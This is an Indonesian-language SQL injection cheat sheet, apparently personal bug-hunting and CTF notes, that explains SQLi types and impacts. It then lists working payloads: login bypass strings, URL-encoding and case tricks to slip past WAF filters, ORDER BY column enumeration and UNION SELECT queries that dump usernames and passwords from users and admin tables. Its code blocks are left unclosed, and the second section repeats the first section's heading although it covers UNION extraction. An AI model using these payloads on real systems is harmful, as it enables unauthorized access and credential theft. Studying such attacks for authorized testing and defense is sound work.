# 💉 SQL Injection (SQLi) Cheat Sheet — 2026 Edition

> "Dari tahun 1998 sampe 2026, SQL Injection masih jadi jalan tolnya para hacker pemula buat masuk ke database."

Dokumentasi pribadi yang tak kumpulin dari hasil *bug hunting*, CTF, dan eksplorasi dunia *cyber security* selama 2025-2026. Bukan buat iseng ngerusak, tapi buat nge-test sistem yang emang udah dikasih izin (*penetration testing legal*) dan buat *reminder* diri sendiri kalo *developer* tuh sering banget lupa sanitasi.

---

## 🧠 SQL Injection — Definisi Ulang di 2026

Dulu gw kira SQL Injection tuh cuma sekedar `admin' or '1'='1` buat *bypass* login. Ternyata pas dipelajari ada banyak jenis SQL Injection, seperti:

* **Error-Based SQLi (Klasik):** Masih yang paling umum, karena tinggal liat *response error* dari database.
* **Blind/Time SQLi:** Gak ada error nongol, tapi kita bisa bedain respon "true" vs "false" dari *delay* atau perubahan konten.


**Intinya:** Selama ada query yang nempel dari input user tanpa *parameterized query*, SQLi bakal selalu ada.

---

## ⚠️ Dampak Nyata SQL Injection (Bukan Cuma Teori)

Gue kasih gambaran konsekuensi yang udah terjadi di dunia nyata, biar makin paham kenapa kerentanan ini masuk kategori *high/critical risk*:

| Dampak | Contoh Kasus Nyata |
| :--- | :--- |
| **Bypass Autentikasi** | Masuk dashboard admin tanpa password cuma modal `' OR 1=1 --` (klasik). |
| **Data Breach Massal** | Database bocor dan di-dump biasanya berawal dari celah SQLi. |
| **Data Manipulation** | Nge-update saldo, ngapus log aktivitas, atau ngubah status pesanan. |
| **RCE (Remote Code Execution)** | Di kasus tertentu (misal SQL Server dengan `xp_cmdshell`), *attacker* bisa eksekusi perintah OS langsung. |

---

## 🔍 Teknik SQL Injection Paling "Nendang" (Top 2026)

Nih gue kumpulin payload-payload yang paling *hits* di tahun 2026, berdasarkan pengalaman gue *pentest* dan riset dari forum-forum *underground* etis.

### 1. Klasik Abadi — Login Bypass (Tanpa Password)
Ini yang paling sering dicoba duluan, soalnya kalo berhasil, lo udah dapet akses admin cuma dalam 5 detik.

```sql
Input: ' OR '1'='1' -- -
Query: SELECT * FROM users WHERE username = '' OR '1'='1' -- - AND password = ''

-- Penjelasan:
-- Kondisi '1'='1' SELALU TRUE, jadi query balikin semua baris.
-- Tanda -- (double dash) di SQL itu artinya komen, jadi sisa query (password) diabaikan.

Tips 2026: Sekarang banyak WAF (Web Application Firewall) yang udah pinter nge-detect OR 1=1. Makanya lo bisa pake encoding atau case manipulation:

```sql
' OR 1=1 --  →  %27%20OR%201%3D1%20--%20
' Or 1=1 --  →  Huruf 'O' besar kecil biar luput dari regex WAF
```
---

### 2. Klasik Abadi — Login Bypass (Tanpa Password)
Kalo lo udah tau jumlah kolom di tabel asli, lo bisa pake UNION buat nyomot data dari tabel lain (misal tabel users).

Langkah pertama: Cari tau jumlah kolom pake ORDER BY sampai muncul error.

```SQL
' ORDER BY 1 -- 
' ORDER BY 2 -- 
' ORDER BY 3 -- 
-- Sampe muncul error, berarti jumlah kolom = (angka sebelum error)
setelah tau kolom tinggal make UNION SELECT:

```SQL
' UNION SELECT NULL -- 
' UNION SELECT NULL,NULL -- 
' UNION SELECT NULL,NULL,NULL -- 
Kalo udah tau jumlah kolom (misal 3), tinggal dump datanya:

```SQL
' UNION SELECT id, username, password FROM users -- 
' UNION SELECT null, name, pass FROM admin -- 
Di 2026, Union-based masih jadi andalan karena response-nya langsung kelihatan di halaman web. Tinggal cocokin posisi kolom yang ditampilin.
